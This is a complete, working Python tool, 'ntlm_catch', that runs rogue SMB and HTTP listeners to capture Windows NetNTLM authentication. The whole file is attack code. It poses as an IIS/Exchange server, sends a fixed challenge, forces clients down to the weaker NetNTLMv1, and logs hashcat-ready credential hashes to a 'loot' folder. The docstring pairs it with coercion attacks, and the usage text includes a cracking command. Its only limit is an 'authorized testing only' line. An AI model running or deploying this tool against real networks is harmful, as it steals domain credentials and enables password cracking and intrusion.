#!/usr/bin/env python3
"""ntlm_catch — minimal NetNTLM capture listener (SMB + HTTP) with v1 downgrade.

A deliberately small, single-file tool that does ONE thing: stand up SMB (445)
and/or HTTP (80) endpoints that answer with an NTLM challenge, hand out a
*fixed* server challenge ("response key"), try to downgrade the client to
NetNTLMv1, then parse and log the Type-3 response in full and emit hashcat-ready
lines.

It is a LISTENER, built for coercion:

  * No poisoning (no LLMNR / NBT-NS / mDNS). You point coerced auth at it
    yourself: PetitPotam / PrinterBug / DFSCoerce -> SMB(445); WebDAV / Exchange
    / @80 tricks -> HTTP(80).
  * No relay, no payloads. It only records what authenticates to it.
  * Never silent. It prints a line the instant a TCP connection is accepted,
    before any protocol parsing — so if tcpdump shows packets, you see them
    here too. (Stock Responder only logs on a *successful* NTLM parse and its
    stdout buffers, which is why it can look dead while traffic arrives.)

NetNTLM (v1 and v2) is the same NTLMSSP Type-1/2/3 exchange on every transport;
v1-vs-v2 is decided by the client's LmCompatibilityLevel plus the ESS flag in
our challenge — NOT by the port. So the same fixed-challenge + downgrade logic
works over SMB and HTTP alike.

Pure Python 3.7+ stdlib. Authorized testing only.
"""
import argparse
import binascii
import base64
import datetime
import itertools
import os
import re
import socket
import socketserver
import ssl
import struct
import sys
import threading
import traceback
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---- NTLM constants --------------------------------------------------------

NTLMSSP_SIG = b"NTLMSSP\x00"

# Type-2 negotiate flags. 0xe2898215 is the usual set; clearing ESS
# (0x00080000) -> 0xe2818215 asks the client to drop NTLM2 session security and
# fall back to plain NetNTLMv1 where its policy allows.
FLAGS_NORMAL = 0xE2898215
FLAGS_NOESS = FLAGS_NORMAL & ~0x00080000  # 0xE2818215

AV_EOL = 0x0000
AV_NB_COMPUTER = 0x0001
AV_NB_DOMAIN = 0x0002
AV_DNS_COMPUTER = 0x0003
AV_DNS_DOMAIN = 0x0004
AV_TIMESTAMP = 0x0007


def _u16(b, off):
    return struct.unpack("<H", b[off:off + 2])[0]


def _u32(b, off):
    return struct.unpack("<I", b[off:off + 4])[0]


def _av(av_id, value_utf16le):
    return struct.pack("<HH", av_id, len(value_utf16le)) + value_utf16le


def _filetime_now():
    epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
    now = datetime.datetime.now(datetime.timezone.utc)
    return struct.pack("<Q", int((now - epoch).total_seconds() * 10_000_000))


def hexu(b):
    return binascii.hexlify(b).upper().decode()


# ---- Type-2 (challenge) builder — transport independent -------------------

def build_type2(challenge8, domain, computer, downgrade):
    """Raw NTLMSSP Type-2 challenge message. Used for both SMB and HTTP."""
    flags = FLAGS_NOESS if downgrade else FLAGS_NORMAL

    dom_u = domain.encode("utf-16-le")
    comp_u = computer.encode("utf-16-le")
    dnscomp_u = (computer + "." + domain).encode("utf-16-le")

    target_name = dom_u
    target_info = (
        _av(AV_NB_DOMAIN, dom_u)
        + _av(AV_NB_COMPUTER, comp_u)
        + _av(AV_DNS_DOMAIN, dom_u)
        + _av(AV_DNS_COMPUTER, dnscomp_u)
        + _av(AV_TIMESTAMP, _filetime_now())
        + struct.pack("<HH", AV_EOL, 0)
    )

    # Fixed header is 56 bytes (incl. the 8-byte Version field).
    header_len = 56
    tn_off = header_len
    ti_off = tn_off + len(target_name)

    msg = bytearray()
    msg += NTLMSSP_SIG
    msg += struct.pack("<I", 2)
    msg += struct.pack("<HHI", len(target_name), len(target_name), tn_off)
    msg += struct.pack("<I", flags)
    msg += challenge8
    msg += b"\x00" * 8
    msg += struct.pack("<HHI", len(target_info), len(target_info), ti_off)
    msg += struct.pack("<BBH", 6, 1, 7601) + b"\x00\x00\x00" + b"\x0f"
    assert len(msg) == header_len, len(msg)
    msg += target_name
    msg += target_info
    return bytes(msg)


# ---- Type-3 (response) parser — transport independent ----------------------

class Type3:
    __slots__ = ("lm", "nt", "domain", "user", "host", "flags",
                 "is_v1", "is_v1_ess", "raw_len")


def parse_type3(data):
    """Parse an NTLM Type-3 message. `data` must start at the NTLMSSP sig."""
    t = Type3()
    lm_len = _u16(data, 12); lm_off = _u32(data, 16)
    nt_len = _u16(data, 20); nt_off = _u32(data, 24)
    dom_len = _u16(data, 28); dom_off = _u32(data, 32)
    usr_len = _u16(data, 36); usr_off = _u32(data, 40)
    hst_len = _u16(data, 44); hst_off = _u32(data, 48)

    t.lm = data[lm_off:lm_off + lm_len]
    t.nt = data[nt_off:nt_off + nt_len]
    t.domain = data[dom_off:dom_off + dom_len].decode("utf-16-le", "replace")
    t.user = data[usr_off:usr_off + usr_len].decode("utf-16-le", "replace")
    t.host = data[hst_off:hst_off + hst_len].decode("utf-16-le", "replace")
    t.flags = _u32(data, 60) if len(data) >= 64 else 0
    t.raw_len = nt_len

    t.is_v1 = nt_len == 24
    # NTLM2 session response (v1 shape + ESS): 24-byte NT, LM = 8-byte client
    # challenge + zero padding. Not crack.sh-friendly.
    t.is_v1_ess = (
        t.is_v1
        and len(t.lm) >= 24
        and t.lm[8:24] == b"\x00" * 16
        and t.lm[:8] != b"\x00" * 8
    )
    return t


def format_v1(t, challenge_hex):
    # hashcat -m 5500 :  user::HOST:LM:NT:SERVERCHALLENGE
    return "%s::%s:%s:%s:%s" % (
        t.user, t.host or t.domain, hexu(t.lm), hexu(t.nt), challenge_hex)


def format_v2(t, challenge_hex):
    # hashcat -m 5600 :  user::DOMAIN:SERVERCHALLENGE:NT[:32]:NT[32:]
    nt_hex = hexu(t.nt)
    return "%s::%s:%s:%s:%s" % (
        t.user, t.domain, challenge_hex, nt_hex[:32], nt_hex[32:])


# ---- SPNEGO / GSS-API DER helpers (for the SMB security blobs) -------------

SPNEGO_OID = binascii.unhexlify("2b0601050502")          # 1.3.6.1.5.5.2
NTLM_OID = binascii.unhexlify("2b06010401823702020a")    # 1.3.6.1.4.1.311.2.2.10


def der_len(n):
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def der(tag, content):
    return bytes([tag]) + der_len(len(content)) + content


def spnego_neg_init():
    """NegTokenInit advertising NTLM — sent in the NEGOTIATE response."""
    mechtypes = der(0x30, der(0x06, NTLM_OID))       # SEQUENCE OF mechType
    tag0 = der(0xA0, mechtypes)                       # [0] mechTypes
    neg = der(0x30, tag0)                             # NegTokenInit SEQUENCE
    inner = der(0xA0, neg)                            # [0] negTokenInit
    return der(0x60, der(0x06, SPNEGO_OID) + inner)   # [APPLICATION 0] GSSAPI


def spnego_challenge(type2):
    """NegTokenResp carrying our Type-2 — sent in SESSION_SETUP #1."""
    neg_state = der(0xA0, der(0x0A, b"\x01"))         # accept-incomplete
    sup_mech = der(0xA1, der(0x06, NTLM_OID))         # supportedMech = NTLM
    resp_tok = der(0xA2, der(0x04, type2))            # responseToken
    return der(0xA1, der(0x30, neg_state + sup_mech + resp_tok))


# ---- SMB2 packet builders --------------------------------------------------

SMB2_MAGIC = b"\xfeSMB"
STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING = 0xC0000016
STATUS_LOGON_FAILURE = 0xC000006D


def smb2_header(cmd, msg_id, session_id, status):
    h = SMB2_MAGIC
    h += struct.pack("<H", 64)             # StructureSize
    h += struct.pack("<H", 0)              # CreditCharge
    h += struct.pack("<I", status)         # Status
    h += struct.pack("<H", cmd)            # Command
    h += struct.pack("<H", 1)              # CreditResponse
    h += struct.pack("<I", 0x00000001)     # Flags = SERVER_TO_REDIR
    h += struct.pack("<I", 0)              # NextCommand
    h += struct.pack("<Q", msg_id)         # MessageId
    h += struct.pack("<I", 0x0000FEFF)     # Reserved (ProcessId, cosmetic)
    h += struct.pack("<I", 0)              # TreeId
    h += struct.pack("<Q", session_id)     # SessionId
    h += b"\x00" * 16                       # Signature
    return h


def smb2_negotiate_resp(msg_id, dialect, secbuf):
    hdr = smb2_header(0x0000, msg_id, 0, STATUS_SUCCESS)
    body = struct.pack("<H", 65)           # StructureSize
    body += struct.pack("<H", 1)           # SecurityMode (signing enabled)
    body += struct.pack("<H", dialect)     # DialectRevision
    body += struct.pack("<H", 0)           # NegotiateContextCount/Reserved
    body += os.urandom(16)                 # ServerGuid
    body += struct.pack("<I", 0)           # Capabilities
    body += struct.pack("<I", 0x00100000)  # MaxTransactSize
    body += struct.pack("<I", 0x00100000)  # MaxReadSize
    body += struct.pack("<I", 0x00100000)  # MaxWriteSize
    body += _filetime_now()                # SystemTime
    body += b"\x00" * 8                     # ServerStartTime
    body += struct.pack("<H", 128)         # SecurityBufferOffset (64+64)
    body += struct.pack("<H", len(secbuf))  # SecurityBufferLength
    body += struct.pack("<I", 0)           # NegotiateContextOffset/Reserved2
    return hdr + body + secbuf


def smb2_session_setup_resp(msg_id, session_id, status, secbuf):
    hdr = smb2_header(0x0001, msg_id, session_id, status)
    body = struct.pack("<HHHH", 9, 0, 72, len(secbuf))  # size,flags,off,len
    return hdr + body + secbuf


# ---- capture sink ----------------------------------------------------------

class Sink:
    def __init__(self, outdir, challenge_hex):
        self.outdir = outdir
        self.challenge_hex = challenge_hex
        self.lock = threading.Lock()
        self.seen = set()
        os.makedirs(outdir, exist_ok=True)
        self.v1_file = os.path.join(outdir, "netntlmv1.txt")
        self.v2_file = os.path.join(outdir, "netntlmv2.txt")
        self.log_file = os.path.join(outdir, "capture.log")

    def handle(self, client_ip, t, source):
        # Null / anonymous session: no NT response and no user -> nothing to
        # crack. Note it but don't pollute the loot files.
        if len(t.nt) == 0 and not t.user:
            print(Color.d("[%s] %s anonymous/null session (no hash)"
                          % (source, client_ip)))
            return

        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if t.is_v1:
            kind = "NetNTLMv1-SSP(ESS)" if t.is_v1_ess else "NetNTLMv1"
            hashline = format_v1(t, self.challenge_hex)
            mode = "5500"
        else:
            kind = "NetNTLMv2"
            hashline = format_v2(t, self.challenge_hex)
            mode = "5600"

        key = (source, t.user.lower(), t.host.lower(), hashline)
        with self.lock:
            dup = key in self.seen
            self.seen.add(key)

        C = Color
        print(C.b("\n[+] [%s] NTLM %s captured  <- %s" % (source, kind, client_ip)))
        print("    time        : %s" % stamp)
        print("    account     : %s\\%s" % (t.domain or "-", t.user or "-"))
        print("    workstation : %s" % (t.host or "-"))
        print("    NT resp len : %d bytes   (LM resp %d bytes)"
              % (len(t.nt), len(t.lm)))
        print("    neg flags   : 0x%08x" % t.flags)
        if t.is_v1_ess:
            print(C.y("    ! NTLM2 session security (ESS) — client kept ESS "
                      "despite downgrade; NOT crack.sh-friendly."))
        elif t.is_v1:
            print(C.g("    * downgrade OK — pure NetNTLMv1, crackable with the "
                      "fixed challenge (crack.sh / hashcat -m 5500)."))
        else:
            print(C.y("    * client stayed on NetNTLMv2 (hardened policy). "
                      "hashcat -m 5600."))
        print("    hashcat -m %s:" % mode)
        print("      " + C.b(hashline))
        if dup:
            print(C.d("    (duplicate — already recorded)"))

        rec = ("%s | %s | %s | %s | %s\\%s @ %s | flags=0x%08x | %s"
               % (stamp, source, client_ip, kind, t.domain, t.user, t.host,
                  t.flags, hashline))
        with self.lock:
            with open(self.log_file, "a") as fh:
                fh.write(rec + "\n")
            if not dup:
                target = self.v1_file if t.is_v1 else self.v2_file
                with open(target, "a") as fh:
                    fh.write(hashline + "\n")


# ---- color -----------------------------------------------------------------

class Color:
    on = sys.stdout.isatty()

    @staticmethod
    def _w(s, c):
        return "\033[%sm%s\033[0m" % (c, s) if Color.on else s

    @staticmethod
    def b(s): return Color._w(s, "1;36")

    @staticmethod
    def g(s): return Color._w(s, "1;32")

    @staticmethod
    def y(s): return Color._w(s, "1;33")

    @staticmethod
    def d(s): return Color._w(s, "0;90")


# ---- persistent full console log ------------------------------------------

_ANSI = re.compile(r"\x1b\[[0-9;]*m")


class _Tee:
    """Mirror everything printed to the console into a file (ANSI stripped),
    so the full connection/handshake trace is persisted, not just captures."""

    def __init__(self, stream, fh):
        self._stream = stream
        self._fh = fh

    def write(self, s):
        self._stream.write(s)
        self._fh.write(_ANSI.sub("", s))
        return len(s)

    def flush(self):
        self._stream.flush()
        self._fh.flush()


# ---- loud connection logging (shared by both servers) ----------------------

class _Loud:
    """Mixin: announce every accepted TCP connection + surface handler errors."""

    def _loud_init(self, tag, verbose):
        self._tag = tag
        self._verbose = verbose
        self._counter = itertools.count(1)
        self._clock = threading.Lock()

    def get_request(self):
        sock, addr = self.socket.accept()
        with self._clock:
            n = next(self._counter)
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(Color.d("[%s conn #%d %s] TCP from %s:%d"
                      % (self._tag, n, ts, addr[0], addr[1])))
        return sock, addr

    def handle_error(self, request, client_address):
        exc = sys.exc_info()[1]
        if isinstance(exc, ssl.SSLError):
            print(Color.y("[!] TLS error from %s: %s (plaintext to HTTPS?)"
                          % (client_address[0], exc)))
            return
        if isinstance(exc, (ConnectionResetError, BrokenPipeError, OSError)):
            print(Color.d("[%s conn %s] closed/reset"
                          % (self._tag, client_address[0])))
            return
        print(Color.y("[!] %s handler error from %s: %s"
                      % (self._tag, client_address[0], exc)))
        if self._verbose:
            traceback.print_exc()


# ---- SMB server ------------------------------------------------------------

def _recvn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def _read_smb(sock):
    """Read one NBSS-framed message (4-byte big-endian length prefix)."""
    hdr = _recvn(sock, 4)
    if not hdr:
        return None
    length = struct.unpack(">I", hdr)[0] & 0x00FFFFFF
    return _recvn(sock, length)


def _frame(msg):
    return struct.pack(">I", len(msg)) + msg


class SMBHandler(socketserver.BaseRequestHandler):
    def handle(self):
        srv = self.server
        ip = self.client_address[0]
        self.session_id = struct.unpack("<Q", os.urandom(8))[0]
        try:
            while True:
                msg = _read_smb(self.request)
                if not msg:
                    break
                out = self._process(msg, srv, ip)
                if out:
                    self.request.sendall(_frame(out))
        except (ConnectionResetError, BrokenPipeError, OSError):
            pass

    def _process(self, msg, srv, ip):
        v = srv._verbose
        # SMB1 multi-protocol negotiate -> switch the client up to SMB2.
        if msg[:4] == b"\xffSMB":
            if len(msg) > 4 and msg[4] == 0x72:
                if v:
                    print(Color.d("    [smb] %s SMB1 negotiate -> offering SMB2"
                                  % ip))
                return smb2_negotiate_resp(0, 0x02FF, spnego_neg_init())
            return None

        if msg[:4] != SMB2_MAGIC:
            print(Color.y("    [smb] %s sent non-SMB data (%d bytes) — ignoring"
                          % (ip, len(msg))))
            return None

        cmd = _u16(msg, 12)
        msg_id = struct.unpack("<Q", msg[24:32])[0]
        req_sess = struct.unpack("<Q", msg[40:48])[0]

        if cmd == 0x0000:  # NEGOTIATE
            print(Color.d("    [smb] %s NEGOTIATE" % ip))
            return smb2_negotiate_resp(msg_id, 0x0210, spnego_neg_init())

        if cmd == 0x0001:  # SESSION_SETUP
            idx = msg.find(NTLMSSP_SIG)
            if idx == -1:
                return smb2_session_setup_resp(
                    msg_id, self.session_id, STATUS_LOGON_FAILURE, b"")
            ntlm = msg[idx:]
            mtype = _u32(ntlm, 8)
            if mtype == 1:
                print(Color.d("    [smb] %s SESSION_SETUP (Type-1) -> challenge "
                              "%s ess=%s"
                              % (ip, srv.sink.challenge_hex,
                                 "off" if srv.downgrade else "on")))
                t2 = build_type2(srv.challenge8, srv.domain, srv.computer,
                                 srv.downgrade)
                sb = spnego_challenge(t2)
                return smb2_session_setup_resp(
                    msg_id, self.session_id, STATUS_MORE_PROCESSING, sb)
            if mtype == 3:
                print(Color.d("    [smb] %s SESSION_SETUP (Type-3)" % ip))
                try:
                    t = parse_type3(ntlm)
                    srv.sink.handle(ip, t, "SMB")
                except Exception as e:
                    print(Color.y("    [!] SMB Type-3 parse failed from %s: %s"
                                  % (ip, e)))
                return smb2_session_setup_resp(
                    msg_id, req_sess or self.session_id,
                    STATUS_LOGON_FAILURE, b"")
            return smb2_session_setup_resp(
                msg_id, self.session_id, STATUS_LOGON_FAILURE, b"")

        # Any other command (tree connect, etc.): deny so the client stops.
        return smb2_header(cmd, msg_id, req_sess, STATUS_LOGON_FAILURE) + \
            struct.pack("<HH", 9, 0)


class LoudSMBServer(_Loud, socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, sink, challenge8, domain, computer,
                 downgrade, verbose):
        super().__init__(addr, SMBHandler)
        self._loud_init("smb", verbose)
        self.sink = sink
        self.challenge8 = challenge8
        self.domain = domain
        self.computer = computer
        self.downgrade = downgrade


# ---- HTTP server -----------------------------------------------------------

def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):

    class Handler(BaseHTTPRequestHandler):
        server_version = "Microsoft-IIS/10.0"
        sys_version = ""
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def _finish_empty(self, code, extra=None):
            self.send_response(code)
            self.send_header("Server", "Microsoft-IIS/10.0")
            for k, v in (extra or []):
                self.send_header(k, v)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def _handle(self):
            auth = self.headers.get("Authorization", "")
            ip = self.client_address[0]
            state = "no-auth" if not auth else auth.split(" ", 1)[0]
            print(Color.d("    [http] %s %s from %s (auth: %s)"
                          % (self.command, self.path, ip, state)))
            clen = int(self.headers.get("Content-Length", 0) or 0)
            if clen:
                try:
                    self.rfile.read(clen)
                except Exception:
                    pass

            if not auth:
                return self._finish_empty(401, [
                    ("WWW-Authenticate", "NTLM"),
                    ("WWW-Authenticate", "Negotiate"),
                ])
            up = auth.upper()
            if not up.startswith("NTLM ") and not up.startswith("NEGOTIATE "):
                return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])
            try:
                token = base64.b64decode(auth.split(" ", 1)[1].strip())
            except Exception:
                return self._finish_empty(400)
            if token[:8] != NTLMSSP_SIG:
                return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])

            mtype = _u32(token, 8)
            if mtype == 1:
                t2 = build_type2(challenge8, domain, computer, downgrade)
                hdr = "NTLM " + base64.b64encode(t2).decode()
                return self._finish_empty(401, [("WWW-Authenticate", hdr)])
            if mtype == 3:
                try:
                    t = parse_type3(token)
                    sink.handle(ip, t, "HTTP")
                except Exception as e:
                    print(Color.y("    [!] HTTP Type-3 parse failed from %s: %s"
                                  % (ip, e)))
                body = b"OK"
                self.send_response(200)
                self.send_header("Server", "Microsoft-IIS/10.0")
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            return self._finish_empty(401, [("WWW-Authenticate", "NTLM")])

        do_GET = _handle
        do_POST = _handle
        do_HEAD = _handle
        do_OPTIONS = _handle
        do_PUT = _handle
        do_PROPFIND = _handle

    return Handler


class LoudHTTPServer(_Loud, ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, handler, verbose):
        super().__init__(addr, handler)
        self._loud_init("http", verbose)


def ensure_selfsigned(certdir):
    cert = os.path.join(certdir, "cert.pem")
    key = os.path.join(certdir, "key.pem")
    if os.path.exists(cert) and os.path.exists(key):
        return cert, key
    os.makedirs(certdir, exist_ok=True)
    import subprocess
    subprocess.check_call([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", key, "-out", cert, "-days", "365",
        "-subj", "/CN=mail.corp.local",
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return cert, key


# ---- main ------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        prog="ntlm_catch.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=__doc__,
        epilog="""examples:
  # SMB(445) + HTTP(80), fixed challenge, downgrade to v1 (defaults)
  sudo python3 ntlm_catch.py

  # SMB only (classic coercion: PetitPotam / PrinterBug / DFSCoerce)
  sudo python3 ntlm_catch.py --mode smb

  # HTTP only, on a high port, no root
  python3 ntlm_catch.py --mode http --http-port 8080

  # capture v2 as-is (no downgrade), custom challenge
  sudo python3 ntlm_catch.py --no-downgrade --challenge 0011223344556677

  # crack captured NetNTLMv1 (fixed challenge -> crack.sh or hashcat):
  hashcat -m 5500 loot/netntlmv1.txt wordlist.txt
""")
    p.add_argument("--mode", choices=["both", "smb", "http"], default="both",
                   help="which listeners to start (default both)")
    p.add_argument("-i", "--bind", default="0.0.0.0",
                   help="interface to bind (default 0.0.0.0)")
    p.add_argument("--smb-port", type=int, default=445, help="SMB port (445)")
    p.add_argument("--http-port", type=int, default=80, help="HTTP port (80)")
    p.add_argument("--challenge", default="1122334455667788",
                   help="8-byte server challenge, 16 hex chars "
                        "(default 1122334455667788 — crack.sh table)")
    dg = p.add_mutually_exclusive_group()
    dg.add_argument("--downgrade", dest="downgrade", action="store_true",
                    default=True, help="clear ESS to force NetNTLMv1 (default)")
    dg.add_argument("--no-downgrade", dest="downgrade", action="store_false",
                    help="leave ESS on; capture whatever the client sends")
    p.add_argument("--domain", default="CORP",
                   help="domain advertised in the challenge")
    p.add_argument("--computer", default="EXCH01",
                   help="computer name advertised in the challenge")
    p.add_argument("-o", "--outdir", default="loot",
                   help="dir for captured hashes + log (default ./loot)")
    p.add_argument("--tls", action="store_true",
                   help="serve HTTPS instead of HTTP (self-signed by default)")
    p.add_argument("--cert", help="TLS cert PEM")
    p.add_argument("--key", help="TLS key PEM")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="log the per-message SMB/HTTP handshake steps")
    p.add_argument("--no-color", action="store_true", help="disable ANSI color")
    args = p.parse_args()

    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    if args.no_color:
        Color.on = False

    ch = args.challenge.replace(" ", "")
    try:
        challenge8 = binascii.unhexlify(ch)
    except binascii.Error:
        p.error("--challenge must be hex")
    if len(challenge8) != 8:
        p.error("--challenge must be exactly 8 bytes (16 hex chars)")

    sink = Sink(args.outdir, hexu(challenge8).lower())

    # Persist the entire console trace (connections, handshake steps, captures,
    # errors) to loot/session.log — no need to remember to `tee`.
    session_log = os.path.join(args.outdir, "session.log")
    try:
        _sfh = open(session_log, "a", buffering=1)
        _sfh.write("\n===== ntlm_catch session %s =====\n"
                   % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        sys.stdout = _Tee(sys.stdout, _sfh)
    except Exception:
        pass

    servers = []
    threads = []

    def start(server, label):
        th = threading.Thread(target=server.serve_forever, daemon=True)
        th.start()
        servers.append(server)
        threads.append(th)
        print("  [+] %s" % label)

    print(Color.b("ntlm_catch — NetNTLM capture (listener only, no poisoning)"))
    print("  challenge   : %s  (fixed)" % hexu(challenge8))
    print("  downgrade   : %s" % ("ON — coaxing NetNTLMv1 (ESS cleared)"
                                  if args.downgrade else "off (ESS kept)"))
    print("  advertising : %s\\%s" % (args.domain, args.computer))
    print("  loot dir    : %s/  (netntlmv1.txt, netntlmv2.txt, capture.log, "
          "session.log)" % args.outdir)

    if args.mode in ("both", "smb"):
        try:
            smb = LoudSMBServer((args.bind, args.smb_port), sink, challenge8,
                                args.domain, args.computer, args.downgrade,
                                args.verbose)
            start(smb, "SMB   listening on %s:%d" % (args.bind, args.smb_port))
        except PermissionError:
            print(Color.y("  [!] SMB %d needs root (try sudo, or --smb-port)"
                          % args.smb_port))
        except OSError as e:
            print(Color.y("  [!] SMB bind failed on %d: %s"
                          % (args.smb_port, e)))

    if args.mode in ("both", "http"):
        try:
            handler = make_http_handler(sink, challenge8, args.domain,
                                        args.computer, args.downgrade,
                                        args.verbose)
            http = LoudHTTPServer((args.bind, args.http_port), handler,
                                  args.verbose)
            use_tls = args.tls or args.cert
            if use_tls:
                if args.cert and args.key:
                    cert, key = args.cert, args.key
                else:
                    cert, key = ensure_selfsigned(
                        os.path.join(args.outdir, "certs"))
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(cert, key)
                http.socket = ctx.wrap_socket(http.socket, server_side=True)
            scheme = "https" if use_tls else "http"
            start(http, "HTTP  listening on %s://%s:%d"
                  % (scheme, args.bind, args.http_port))
        except PermissionError:
            print(Color.y("  [!] HTTP %d needs root (try sudo, or --http-port)"
                          % args.http_port))
        except OSError as e:
            print(Color.y("  [!] HTTP bind failed on %d: %s"
                          % (args.http_port, e)))

    if not servers:
        print(Color.y("[!] no listeners started — nothing to do."))
        return

    print(Color.d("  no poisoning / no relay — point coerced auth here "
                  "yourself.  Ctrl-C to stop.\n"))
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        print("\n[*] stopping...")
        for s in servers:
            s.shutdown()
        print("[*] stopped. loot in %s/" % args.outdir)


if __name__ == "__main__":
    main()
